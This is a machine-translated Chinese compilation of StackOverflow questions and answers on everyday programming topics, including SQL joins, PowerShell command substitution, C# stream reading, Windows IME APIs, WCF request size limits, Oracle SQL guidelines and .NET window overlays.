# StackOverflow 问答 000434000-000434999

# grails-orm - Gorm 主窗口不接受拖放

> ID：434007
> 
> 赞同：0
> 
> 时间：2009-01-11T23:29:10.337
> 
> 标签：grails-orm, gnustep

当我尝试将任何小部件（标签、按钮...）添加到 Gorm 中的主应用程序窗口时，窗口不接受小部件。我尝试拖放，但没有什么想要“粘”的。当我选择并左键单击调色板窗口中的按钮小部件时，光标变为“2 个绿色方块”。当我开始拖动时，它变为“2 个黑色方块”。

另一个问题是“文档”窗口打开了非常长的窗口（大约是我屏幕宽度的 5 倍），但除了 NSOWner、NSFirst、My Window 和 NSMenu 图标之外，它是空的。

有什么想法有什么问题吗？

我正在使用fluxbox-1.1.1 运行linux 我已经编译了gorm-1.2.8 和gnustep-startup-0.22.0，其中包含：

ffcall-1.10 gnustep-back-0.16.0 gnustep-base-1.18.0 gnustep-gui-0.16.0 gnustep-make-2.0.7 gnustep-objc-1.6.0 libffi-3.0.1

任何帮助表示赞赏。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-08-24T02:22:25.203

现有运行时库与我尝试添加的新库之间可能存在兼容性问题或冲突。似乎没有一个简单的答案。没关系，我放弃了尝试atm。也许稍后当我安装另一个 Linux 机器时，我会试一试——我现在会继续使用 Mac OS X :)

# air - adl 命令行 静音

> ID：434008
> 
> 赞同：0
> 
> 时间：2009-01-11T23:29:20.537
> 
> 标签：air

我今天开始开发一个新的 air/html/ajax 应用程序，由于某种原因，我的 trace() 输出不再打印到控制台窗口。另外，我也没有收到任何针对语法错误或运行时错误的错误消息。我在另一台机器上试过，没有问题，所以这台机器一定有问题。我认为这与我使用 flex 3 sdk 有关，但是从我的路径变量中删除它并没有帮助，重新安装 air sdk 也没有帮助。如果有人以前遇到过这种情况，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T14:55:58.033

这并不特定于调试器播放器。ADL 控制台中跟踪语句的可用性取决于您的`mm.cfg`文件中是否启用了以下任一设置：

*   `ErrorReportingEnable`
*   `TraceOutputFileEnable`

其中任何一个都会阻止控制台窗口中的跟踪输出 -`stderr`我相信 - 而是（在 的情况下`TraceOutputFileEnable`）将其重定向到日志文件。

更多信息`mm.cfg`可[在此处](http://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7fc9.html)获得。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-14T02:18:47.263

我想到了。这是因为我安装了 Flash 调试播放器。现在错误消息都进入调试播放器写入的日志文件。

# mysql - 如何列出三向连接表查询中的第一个值？

> ID：434013
> 
> 赞同：1
> 
> 时间：2009-01-11T23:31:50.610
> 
> 标签：mysql, sql, mysql-5.0

嗯，好吧，我不擅长解释事情，所以我先给你引用和链接：

[问题 4b](http://sqlzoo.net/3.htm)（接近底部）：

> 4b。列出所有“朱莉·安德鲁斯”电影的片名和男主角。
> 
> > 电影(id, title, yr, score, votes, director)
> > actor(id, name)
> > cast(movieid, actorid, ord)
> > *(注：movie.id = cast.movi​​eid, actor.id = cast.actorid)*

我的回答（不起作用）：
`    SELECT title, name
      FROM casting JOIN movie
              ON casting.movieid = movie.id
      JOIN actor
              ON casting.actorid = actor.id
     WHERE name = 'Julie Andrews'
       AND ord = 1`

这里的问题是它想要以“朱莉安德鲁斯”作为演员的电影的主要演员名单（不一定是主要演员），但我所做的只是让她担任主角的电影(ord = 1)。

如果没有“朱莉安德鲁斯”，我如何指定主要演员名单？我怀疑我必须对 GROUP BY 做点什么，但我现在不知道是什么......

**编辑：**我需要使用嵌套的 SELECT 吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-11T23:48:33.870

使用子查询有很多很好的方法，但在本教程的这一点上，您似乎只使用 JOIN。以下是仅使用 JOIN 的方法：

```
SELECT
  movie.title,
  a2.name
FROM
  actor AS a1
  JOIN casting AS c1 ON (a1.id = c1.actorid)
  JOIN movie ON (c1.movieid = movie.id)
  JOIN casting AS c2 ON (movie.id = c2.movieid)
  JOIN actor AS a2 ON (c2.actorid = a2.id)
WHERE 
  a1.name = 'Julie Andrews'
  AND c2.ord = 1 
```

**编辑（更具描述性）：**

这将为我们提供一个包含 Julie Andrews 出演的所有电影的表格。我将演员表和演员表分别别名为 a1 和 c1，因为现在我们已经找到了电影列表，我们将不得不转向并匹配再次对着铸造台。

```
SELECT
  movie.*
FROM
  actor a1
  JOIN casting c1 ON (a1.id = c1.actorid)
  JOIN movie ON (c1.movieid = movie.id)
WHERE
  a1.name = 'Julie Andrews' 
```

现在我们有了她演过的所有电影的列表，我们需要将其与演员表（如 c2）和演员表（如 a2）相结合，以获得这些电影的主角列表：

```
SELECT
  movie.title,  -- we'll keep the movie title from our last query
  a2.name       -- and select the actor's name (from a2, which is defined below)
FROM
  actor a1                                     -- \
  JOIN casting AS c1 ON (a1.id = c1.actorid)   --  )- no changes here
  JOIN movie ON (c1.movieid = movie.id)        -- /
  JOIN casting AS c2 ON (movie.id = c2.movieid)  -- join list of JA movies to the cast
  JOIN actor AS a2 ON (c2.actorid = a2.id)  -- join cast of JA movies to the actors
WHERE 
  a1.name = 'Julie Andrews'  -- no changes
  AND c2.ord = 1    -- only select the star of the JA film 
```

编辑：在别名中，“AS”关键字是可选的。我在上面插入了它以帮助查询更有意义

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-11T23:50:59.793

您希望将电影与`casting`表中两个可能单独的行进行匹配：第一行是 Julie Andrews 是演员，第二行可能是也可能不是 Julie Andrews，但它是电影的男主角。

> 朱莉<--->参演<--->电影<--->主演<--->男主角

所以你需要加入`casting`表两次。

```
SELECT m.title, lead.name
FROM actor AS julie
 JOIN casting AS c1 ON (julie.id = c1.actorid)
 JOIN movie AS m ON (c1.movieid = m.id)
 JOIN casting AS c2 ON (m.id = c2.movieid)
 JOIN actor AS lead ON (c2.actorid = lead.id)
WHERE julie.name = 'Julie Andrews'
 AND c2.ord = 1; 
```

请记住，“表别名”引用可能不同的行，即使它们是同一个表的别名。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-11T23:43:44.317

```
SELECT title, name
      FROM casting JOIN movie
              ON casting.movieid = movie.id
      JOIN actor
              ON casting.actorid = actor.id
     WHERE ord = 1
     and   casting.movieid in 
          (select movieid
           from   casting
                  join actor
                      on actor.id = casting.actorid
           where  actor.name = 'Julie Andrews') 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T04:20:10.497

顺便说一句，这是网站上发布的答案（我刚刚发现）：

```
SELECT title, name
  FROM movie, casting, actor
  WHERE movieid=movie.id
    AND actorid=actor.id
    AND ord=1
    AND movieid IN
    (SELECT movieid FROM casting, actor
     WHERE actorid=actor.id
     AND name='Julie Andrews') 
```

去搞清楚。:P

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-22T06:44:22.830

```
select title, name  from movie join casting on movie.id=movieid
join actor on actor.id=actorid 
where ord=1 and movieid in (select movieid from actor join casting 
                                            on actor.id=actorid 
         where name='julie andrews' and (ord=1 or ord<>1))group by title, name 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-08-07T14:23:15.370

@Bill Karwin 的回答有利于方向。然而，结果证明有些电影的名字已经出现了不止一次。所以我们需要在 SELECT 行的 title 之前添加一个 DISTINCT 函数。

```
SELECT DISTINCT m.title, lead.name 
```

* * *

如果你想要更快速的响应，你也可以用这种方式编写代码。

```
SELECT DISTINCT m.title, lead.name
 FROM actor AS julie
  JOIN casting AS c1 ON (julie.id = c1.actorid AND julie.name = 'Julie Andrews')
  JOIN movie AS m ON (c1.movieid = m.id)
  JOIN casting AS c2 ON (m.id = c2.movieid)
  JOIN actor AS lead ON (c2.actorid = lead.id)
 WHERE  c2.ord = 1; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-09-08T13:20:26.933

```
I ve done simply like this

select distinct title,name from 
(select movie.* from movie
inner join casting on (movie.id = casting.movieid)
inner join actor on (casting.actorid = actor.id)
where actor.name = 'Julie Andrews' ) as moviesFromJulie

inner join casting on (moviesFromJulie.id = casting.movieid)
inner join actor on (casting.actorid = actor.id)
where ord = 1 
```

检索朱莉·安德鲁斯出演的所有电影，然后为这些电影检索序数 = 1 的所有电影和演员，并为独特的结果而区分

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-01-31T08:31:45.160

分享一个简单的答案-

`select title, name from movie join casting on movie.id=movieid join actor on actor.id=actorid where ord=1 and movie.id in (select movie.id from movie join casting on movie.id=movieid join actor on actor.id=actorid where name='Julie Andrews')`

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-01-13T16:22:59.030

```
SELECT title , name
FROM movie JOIN casting ON (casting.movieid=movie.id) JOIN actor ON (actor.id=actorid)
WHERE (movieid IN (SELECT movieid
FROM casting JOIN actor ON (actor.id=actorid)
WHERE name =  'Julie Andrews')) AND (ord=1) 
```

# java - 使用 Hibernate 和 hbm2java 进行类继承

> ID：434014
> 
> 赞同：2
> 
> 时间：2009-01-11T23:31:50.627
> 
> 标签：java, hibernate, hbm2java

我正在使用 hbm2java 从我的 hbm 文件生成域对象，现在我希望它们都继承一个基类。这个类将有一些处理监听器的实用方法。它并不需要被持久化，我希望我不必为它做一个 hbm 文件，因为它是抽象的并且只有方法。是否有元标记或其他东西让所有生成的类扩展另一个类？

或者这是一个蹩脚的设计，它根本无法用hibernate来完成？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-11T23:37:21.550

我记得我是这样做的。看到这个：[http ://docs.jboss.org/tools/2.1.0.Beta1/hibernatetools/html_single/#d0e4159](http://docs.jboss.org/tools/2.1.0.Beta1/hibernatetools/html_single/#d0e4159)

基本上，您想在此处使用元标记，其属性为公共基类*扩展*或为公共基接口实现*。*

# javascript - Visual Studio 2008 中的 Javascript 调试

> ID：434019
> 
> 赞同：6
> 
> 时间：2009-01-11T23:33:54.430
> 
> 标签：javascript, visual-studio-2008, debugging

我试图通过在 VS2008 中添加断点来调试 javascript 代码，但调试器并没有停止。我是否必须进行一些特殊设置才能启用 javascript 调试？还是代码必须在单独的 js 文件中？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-12T20:49:26.833

您是否取消选中设置中的复选框

工具-->Internet选项-->高级-->浏览[标题]->取消选中“禁用脚本调试（Internet Explorer）”并取消选中“禁用脚本调试（其他）”

有时你需要重新启动浏览器才能让 VS2008 识别出它已经做出了一些改变。

您是否尝试过坚持“调试器”；关键字到您的 JavaScript 文件中？这通常不会让我失望。

如果你有 IE8，你可以直接在浏览器中调试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-11T23:36:29.870

任何特定的浏览器？主要适用于 IE，需要在 IE 网络选项中启用脚本调试（高级 => 浏览）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-11T23:53:47.057

我不了解 VS2008，但我知道我永远无法让调试器在 aspx 中的断点处停止（而不是链接的 js 文件）。

如果您没有在项目中运行它，而只是动态调试，请确保附加到浏览器的进程。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T00:26:43.760

我知道这不是你问的，但我必须插入[Firebug](https://addons.mozilla.org/en-US/firefox/addon/1843)以进行 JS 调试，包括断点、监视语句、单步执行和实时 JS 控制台。

# bash - Bash 上的 cmd/PowerShell 等价物是什么？

> ID：434038
> 
> 赞同：78
> 
> 时间：2009-01-11T23:40:23.260
> 
> 标签：bash, powershell, cmd

重定向命令输出：

例如：

```
echo "Foo `./print_5_As.rb`" 
```

会回显“Foo AAAAA”

* * *

## 回答 #1

> 赞同：150
> 
> 时间：2009-01-12T03:00:42.547

PowerShell 语法基于 POSIX ksh 语法（有趣的是，它*不*基于任何 Microsoft 的语言，如 CMD.EXE、VBScript 或 Visual Basic for Applications），所以很多东西的工作方式与 Bash 中的几乎相同。在您的情况下，命令替换是通过

```
echo "Foo $(./print_5_As.rb)" 
```

在 PowerShell 和 Bash 中。

Bash 仍然支持古老的方式（反引号），但 PowerShell 清理了语法并删除了冗余结构，例如两种不同的命令替换语法。*这为 PowerShell 中的不同*用途释放了 反斜杠：在 POSIX ksh 中，反斜杠用作转义字符，但在 PowerShell 中这将*非常*痛苦，因为反斜杠是 Windows 中传统的路径组件分隔符。因此，PowerShell 使用（现在未使用的）反引号进行转义。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2009-01-12T01:33:13.800

在 PowerShell 中，您使用 $( ) 来评估子表达式...

例如：

```
PS C:\> "Foo $(./print_5_As.rb)"
Foo AAAAA 
```

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2009-01-12T00:13:24.803

在 CMD.EXE 中没有直接的等价物。但是你可以使用 FOR 命令来实现你想要的。

执行以下操作：

```
FOR /F "usebackq" %x IN (`./print_5_As.rb`) DO @echo Foo %x 
```

或者

```
FOR /F %x IN ('"./print_5_As.rb"') DO @echo Foo %x 
```

您可能需要将 delimiter 设置为默认值以外的其他值，具体取决于输出的外观以及您希望如何使用它。[有关更多详细信息，请参阅https://technet.microsoft.com/en-us/library/bb490909.aspx](https://technet.microsoft.com/en-us/library/bb490909.aspx)上的 FOR 文档

# c# - C# 使用 FileStream 读取“Zip”文件

> ID：434039
> 
> 赞同：2
> 
> 时间：2009-01-11T23:41:09.640
> 
> 标签：c#, zip, filestream, tcpclient

我编写了一个程序，该程序将使用 TCPClient 建立与远程计算机的网络连接，我正在使用它将 100k 块中的文件传输到远程 .net 应用程序，然后将它们写入硬盘驱动器。除了 ZIP 文件之外，所有文件传输都运行良好 - 奇怪的是，重新组合的文件始终为 98K ...... ZIP 文件是否存在一些不为人知的秘密，以防止以这种方式处理它们。同样，所有其他文件传输工作正常，图像、xls、txt、chm、exe 等。

使困惑

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-11T23:48:48.953

好吧，您还没有显示任何代码，所以要准确地说出什么是错的有点棘手。

*通常*的错误是假设 Stream.Read 读取了您要求它读取的所有数据，而不是意识到它可能读取的更少，但它*实际*读取的数量是返回值。

换句话说，代码不应该是：

```
byte[] buffer = new byte[input.Length];
input.Read(buffer, 0, buffer.Length);
output.Write(buffer, 0, buffer.Length); 
```

但类似：

```
byte[] buffer = new byte[32 * 1024];
int bytesRead;
while ( (bytesRead = input.Read(buffer, 0, buffer.Length)) > 0)
{
    output.Write(buffer, 0, bytesRead);
} 
```

但这只是一个猜测。如果您可以发布一些代码，我们将有更好的机会弄清楚它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T00:23:54.297

实际的代码会有所帮助。

你在使用 BinaryReader / BinaryWriter 吗？

（即基于数据而不是基于文本）。

您可以尝试使用十六进制文件比较（例如[Beyond Compare](http://www.scootersoftware.com/)）来比较原始文件和副本，看看是否能给您任何线索。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-11T23:47:25.213

可能是您在收到每个块时覆盖（而不是附加到）现有文件？因此文件的最终大小将是 <= 一个块的大小。

但是没有任何代码，很难说出问题的原因。

# windows - 你如何使用输入法？

> ID：434048
> 
> 赞同：18
> 
> 时间：2009-01-11T23:46:46.073
> 
> 标签：windows, winapi, ime

我想做一个处理用户输入的控件，所以我希望能够处理不同的键盘，其中一种方法是使用 IME。

如果你不处理它，当你激活 IME 时会出现一个浮动窗口（例如激活日语书写）。我找到了需要处理的消息，但我不知道如何将我捕获的密钥发送到 IME 以及何时获得有效的转换字符。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2009-08-08T21:54:29.553

*我是 Microsoft SDE，曾经维护（Windows 和 Office）韩语 IME 一段时间...*

不幸的是，非 Microsoft 站点提供了最好的 IME API 文档：

*   **来自 Google 的 Chrome 浏览器的 **IME 编程示例**（*非常好的注释代码！）*

    *   [ime_input.h](http://code.google.com/p/chrome-browser/source/browse/trunk/src/chrome/browser/ime_input.h)
    *   [ime_input.cc](http://code.google.com/p/chrome-browser/source/browse/trunk/src/chrome/browser/ime_input.cc)** 
***   [用于 IME 开发的 Win32 多语言 IME 概述](http://www.osronline.com/ddkx/appendix/imeimes_0h2s.htm)（[存档](https://web.archive.org/web/20121025165821/http://www.osronline.com/ddkx/appendix/imeimes_0h2s.htm)）*   [Win32 多语言 IME 应用程序编程接口](http://www.osronline.com/ddkx/appendix/imeimes2_35ph.htm)（[存档](https://web.archive.org/web/20120705150510/http://www.osronline.com/ddkx/appendix/imeimes2_35ph.htm)）
    *（值得微软称赞的是，最后两个曾经是 Windows 驱动程序开发工具包的一部分）***

 *** * *

这是微软官方文档：[输入法管理器（MSDN）](http://msdn.microsoft.com/en-us/library/dd318641(VS.85).aspx)

还有一个新的、更高级的基于文本服务框架 (TSF) 的 IME，Microsoft 希望您使用它，但它更复杂，而且旧的 API 模拟得很好。如果您不需要任何高级功能（例如通过平板电脑/语音识别/更高级的 IME/等输入），那么使用旧 API 就足够了。

关于文本服务框架的最佳文档是另一位 Microsoft 开发人员编写的[TSF Aware 博客。](http://blogs.msdn.com/tsfaware/)如果你走这条路，埃里克布朗甚至可以亲自回答你的问题。

这是 TSF 的官方 Microsoft 文档：[Text Services Framework (MSDN)](http://msdn.microsoft.com/en-us/library/ms629032(VS.85).aspx)

您可能会发现 TSF 的一项有用功能是抑制 IME 呈现的能力（例如，需要自己呈现 IME 的全屏游戏）。只需告诉 TSF 你的应用程序将呈现 IME GUI，然后实现一个空的呈现方法：[UILess Mode Overview (MSDN)](http://msdn.microsoft.com/en-us/library/aa966970(VS.85).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-11T23:55:14.073

我认为您不想阻止显示 IME。除了测试之外，我从未使用过其他方法，但据我了解，IME 是使用英文键盘输入非英文字符的预期/默认方式。

如果您正在编写控件并希望完全支持 IME，我认为您拥有的两个选项是响应各种 Windows 消息（如 WM_IME_START_COMPOSITION、WM_IME_COMPOSITION 等）或使用文本服务框架 (TSF)。我的理解是 TSF 是未来，在 Vista 和 Windows 7 中，所有 IME 代码都基于 TSF，Windows 消息仍然存在以与旧程序兼容。

# wcf-data-services - 如何增加发送到 ADO.Net 数据服务的数据大小？

> ID：434051
> 
> 赞同：0
> 
> 时间：2009-01-11T23:48:01.577
> 
> 标签：wcf-data-services

我有一个采用字节数组的数据服务。然后，我有一个网页尝试将文件发送到该数据服务。如果文件很小（比如 50kb），那么一切都按预期运行，但是如果文件很大（超过 100kb），我会在数据服务的保存更改调用中收到“BadRequest”错误消息。

有没有办法将更大的数据大小传递给数据服务？

编辑（更多详细信息）：我将 maxRequestLength 设置得更高，并尝试了一些 webHttpBinding 来增加 maxReceivedMessageSize，但这些似乎没有帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-15T16:15:53.937

WCF 服务可以处理的请求的最大大小由 WCF 绑定上的 MaxReceivedMessageSize 属性控制。默认值为 65536 ，超过该值会得到 400 响应码。

在托管服务的网站的 web.config 中，在部分中添加以下节点。

```
<system.serviceModel> 
<services> 
  <!-- The name of the service --> 
  <service name="NorthwindService"> 
    <!-- you can leave the address blank or specify your end point URI --> 
    <endpoint address ="YourServiceEndpoint" 
              binding="webHttpBinding" bindingConfiguration="higherMessageSize" 
     contract ="System.Data.Services.IRequestHandler"> 
    </endpoint> 
  </service> 
</services> 
<bindings> 
  <webHttpBinding> 
    <!-- configure the maxReceivedMessageSize  value to suit the max size of 
         the request ( in bytes ) you want the service to recieve--> 
    <binding name="higherMessageSize" maxReceivedMessageSize ="MaxMessageSize"/> 
  </webHttpBinding> 
</bindings> 
<serviceHostingEnvironment aspNetCompatibilityEnabled="true"/> 
</system.serviceModel> 
```

如果托管在 IIS 上，ASP.Net 请求大小限制也会导致大型请求被拒绝，您需要设置 HttpRuntimeSection.MaxRequestLength 属性。

```
<system.web> 
  <httpRuntime MaxRequestLength="ValueInKiloBytes" />
</system.web> 
```

确定 WCF 是否在幕后引发了未在 HTTP 级别向您展示的异常。您可以[在服务器端配置 WCF 跟踪](http://msdn.microsoft.com/en-us/library/ms733025.aspx)以记录来自 WCF 层的必要信息。一旦您进行了跟踪设置并重现了故障，请检查日志是否包含这些异常消息中的一个或两个。

```
System.ServiceModel.ProtocolException
"The maximum message size quota for incoming messages (65536) has been exceeded. 
To increase the quota, use the MaxReceivedMessageSize property on the appropriate binding element."

System.Web.HttpException
"Maximum request length exceeded." 
```

如果您看到日志确实包含此消息，那么您可以确定失败是由于消息大小造成的，并相应地应用此修复。

**PD：**请记住，您的表单必须使用该`"POST"`方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2011-04-13T11:44:30.200

我还尝试编辑 web.config 文件，但没有结果。我仍然得到同样的例外。

一个对我有用的解决方案是编辑**machine.config**文件并在 System.ServiceModel 节点中添加以下行。

```
<standardEndpoints>
        <webHttpEndpoint>
            <standardEndpoint name="" maxReceivedMessageSize="16777216" maxBufferSize="16777216" />
        </webHttpEndpoint>
    </standardEndpoints> 
```

我不知道这是否是正确的解决方案，但它对我有用。

# sql - 对于针对 Oracle 编写好的 SQL，您会给您的开发人员哪些简单的指导？

> ID：434061
> 
> 赞同：2
> 
> 时间：2009-01-11T23:54:07.057
> 
> 标签：sql, oracle, plsql

我在一个由大约 25 名开发人员组成的团队中工作。我负责提出数据库设计（表、视图等），并在必要时被称为 apon 以进行性能调整。

有几个不同的应用程序可以连接。数据库访问是通过 JDBC、hibernate 和 iBatis SQL 映射来实现的。具有不同经验水平的开发人员编写 SQL 语句。

您会为开发人员编写好的 SQL 提供哪些指导？

好的我的意思是：正确、执行良好、易于理解和维护。

这些只是为了易于遵循指导方针——我想让人们在大多数情况下走上正确的轨道。我们将在合理时打破这些准则。

编辑：我们对通过 jira 工作流强制执行的所有源提交（SQL、java 等）进行了代码审查。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-12T00:09:17.913

如果您有 25 名开发人员针对您的数据库编写 SQL 查询，那么您将遇到很多麻烦。当您的初级开发人员正在学习 SQL 并检查混乱时，指南并不值得。

我想提供 4 条建议

1.  使用某种 ORM，这样您的所有开发人员都会编写更少的 SQL。
2.  投资培训，购买书籍，派人参加课程。
3.  所有的 SQL 都经过高级 SQL 开发人员的审查，我的意思是每条 SQL 语句，没有例外。这样，随着时间的推移，您的高级人员将能够教初级人员。
4.  有一个人，他生活和呼吸 Oracle，负责数据库。负责任的意思是知道每个查询，了解所有结构并能够提供专家建议。

以下是您可以添加到现有指南/清单中的一些额外内容。

*   您是否在大型数据集上测试过您的查询？表现如何？
*   您是否对正在访问的表进行了快速索引审查？所有正确的索引都到位了吗？你推荐和新的索引？
*   对于大量查询，是否需要任何覆盖索引？
*   在应该使用“LEFT JOIN”的情况下，您是否使用“NOT IN”？
*   你的工作在交易上是合理的吗？您是否错过了某处的交易？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-12T02:01:09.157

这是我的指南中已有的内容。

*   成组工作，而不是逐行
*   让事情进展得更快的最好方法是避免做你不必做的工作
*   数据库喜欢加入
*   完全限定并指定列名（因此在添加其他列时 SQL 不会中断）
*   只选择你需要的数据（永远不要选择*，永远不要比你需要的行多，永远不要每列都只是因为它在那里）
*   如何使用 rownum 限制结果集
*   绑定变量与文字（在所有与倾斜数据相关的特殊情况下使用绑定变量）
*   避免对 WHERE 子句中的列进行函数或计算（基于函数的索引的特殊情况除外）
*   对返回多于一行的所有查询使用 ORDER BY（这主要是为了可测试性）

在我用与我们的数据库模式相关的示例编写的实际指南中，这些要点中的每一个都得到了扩展。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-12T18:12:38.197

阅读汤姆凯特的书。他解释了如何编写快速代码以及如何衡量性能和可伸缩性。如果您有问题，您可能可以在“ask tom”网站上找到答案。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-15T23:56:26.737

*   如果您是数据库开发人员，您需要知道什么是**执行计划**。如果您不这样做，那就去煤矿或其他地方。
*   开发前：
    *   **首先**，你认为最好的**执行计划**是什么，
    *   **其次**，您创建表和索引，并且
    *   **第三**，您使用提示来说服优化器提出您制定的计划。
*   你*确实*使用**了提示**。忘记自动优化，这是一个营销神话。没有优化器比您更了解您的数据，而且永远不会。
*   没有“创建查询的程序员”和“创建索引的系统管理员”。程序员编程，系统管理员进行备份（或他们所做的任何事情）。
*   触发器是邪恶的。
*   为列、表和视图添加前缀 ( `SELECT prs_name FROM t_person`)
*   制作线条和缩进

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-12T00:17:29.130

介绍基本风格指南，包括：

*   命名（一切 - 表，列，过程，别名，...）。
*   格式样式
    *   行宽
    *   哪些保留字需要换行（例如 where）
    *   是保留字大写或小写
    *   缩进
    *   ...

这里有些例子：

*   [Oracle PL/SQL 编程，第四版](http://oreilly.com/catalog/9780596009779/)。有较旧的[第 2 版](http://oreilly.com/catalog/oraclep2/chapter/ch03.html)- 可在线获取
*   [SQL 和 PL/SQL 编码标准](http://www.dba-oracle.com/t_plsql_best_practices_standards.htm)

命名要严格，你会更容易看懂别人的代码。
至于格式化，有一些工具可以自动格式化，所以这里可能不需要很详细的描述。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-16T00:12:08.717

Pair-program. Any advantange it provides for agile development in general, at least doubles for SQL development.

Second choice, code reviews for all SQL.

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-12T01:15:09.920

一个小时的关于 Oracle 基础知识（例如解析、SGA 与 PGA）的演示。“这样做”规则可能适用于您的情况，也可能不适用于您的情况。让他们了解数据库方面的工作，他们至少有一个做出决定的基础。加上代码审查。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-23T09:56:13.047

我绝不是大师，但这里是我的提示：

*   除非您确实需要有序列表，否则不要使用 ORDER BY，因为它会导致性能下降。
*   了解解释计划，并认识到您的开发环境的计划通常与您的生产环境不同。不要指望它能准确反映现实生活中的表现
*   使用提示的优点是您可以选择解释计划，使用提示的缺点是最佳计划可能会随着时间而改变，并且您可能会选择长期不理想的计划
*   确保开发人员知道何时使用 INNER JOIN、OUTER JOIN、[NOT] IN、[NOT] EXISTS - 您可以实施很多流程，但一两个笛卡尔产品会降低生产性能
*   确保您的开发人员了解索引 - 它们是什么、何时应该使用、何时应该避免使用
*   让 DBA 监视执行次数最多的查询和最昂贵的查询，并将它们突出显示为优化的候选对象
*   同行评审
*   编码标准（尤其是对特别长/复杂查询的代码注释）
*   单元测试

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-12T17:11:17.167

除了由高级程序员审查查询的建议外，如果您能获得支持，请让尽可能多的团队成员参与代码审查。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-01-12T00:02:28.863

*   如果可以，请不要编写 SQL，尽可能使用 HQL（或 JPQL 在 Java EE 上）
*   不要使用`SELECT *`
*   明智地选择您的互联网资源（例如`asktom.oracle.com`）
*   不要使用游标
*   不要在 SQL 中进行字符串连接
*   编写查询以便它们使用索引（从根本上说，这意味着 WHERE 谓词基于存在的索引）
*   使用`MERGE`而不是其他笨拙*的“upsert”*类型逻辑
*   处理日期时，请确保您了解它们在 Oracle 中的存储方式与它们在 Java 中的存储方式，尤其是与 TimeZone 相关时。根据日历/日期类型，可以删除此信息，重新映射到默认语言环境的 TZ 等。
*   最重要的是：不要以作为开发人员不知道如何编写好的 SQL 以及数据库如何工作为借口。您不必成为 DBA，但您需要投资于自己的培训以使自己适合这项任务。同样，您的公司也需要对此进行投资。

我并不是说这些“不要”总是适用。只是，如果您谈论的是对 Oracle 不满意的开发人员，他们需要在开始决定这些类型的事情是否必要和适当之前知道自己在做什么。

# c# - 在 .NET 中实现粘性覆盖

> ID：434065
> 
> 赞同：2
> 
> 时间：2009-01-11T23:55:18.083
> 
> 标签：c#, .net, overlay

我正在寻找一种很好的方法来在我自己不拥有*的本机 Windows 窗体*上呈现叠加层，最好使用可用于 .NET 的库（WinForms、GTK#、...）。准确地说，我想在窗口的给定位置显示一些标签或文本框。

**设备上下文和 System.Drawing：**我目前正在做的是直接绘制到其他窗口的设备上下文上，这会导致闪烁，因为其他应用程序的一部分会以不可预测的间隔重绘。因此，我将不得不使用钩子魔法来捕捉它的 WM_PAINT 事件，但这实际上并没有我想去的那么远，除非没有更简单的方法。

**带有可见子标签的透明窗口覆盖：**我尝试的另一种技术是创建一个具有其他窗口大小的 Windows.Forms.Form，使用 TransparencyKey 使只有子可见。这似乎很难纠正，因为我不希望窗口是最上面的窗口，而只是在外部窗口上方的*一个*Z 级。好处是，我可以为其添加更多行为，因为我实际上可以处理点击事件等。

您将如何实现它/处理上述两种技术中的问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T02:51:09.943

绝对使用透明窗口方法，因为它应该更容易实现。创建透明表单非常容易。您已经知道如何使用 TransparenyKey 使背景不被绘制。还要从窗口中删除边框并删除最小/最大/关闭按钮，这样您就不会显示任何镀铬。

将您的窗口创建为感兴趣的窗口所拥有的，它将始终位于目标之上并像无模式对话框一样工作。即只有在拥有窗口可见时才可见。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T07:54:43.780

谢谢你的回答，但我还是有点困惑。您将如何将窗口的所有者设置为您自己的应用程序不拥有的任何内容？我想当其他应用程序不受管理时，这甚至是不可能的，是吗？

编辑：

我现在离我更近了一步。示例代码在 Boo 中。

```
[DllImport("user32.dll", SetLastError: true, CharSet: CharSet.Auto)]
public def SetParent(child as IntPtr, parent as IntPtr):
    pass

def createAttachedForm(parentHandle as IntPtr):
  f = Form()
  f.Text = "My overlay"
  f.Show()
  SetParent(f.Handle, parentHandle)
  Application.Run(f) 
```

现在只有 TransparencyKey 的东西似乎不起作用。相反，当设置值时，表单是完全不可见的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-19T00:57:36.860

设置表单的所有者可以通过

```
Form.Show(IWin32Window w) 
```

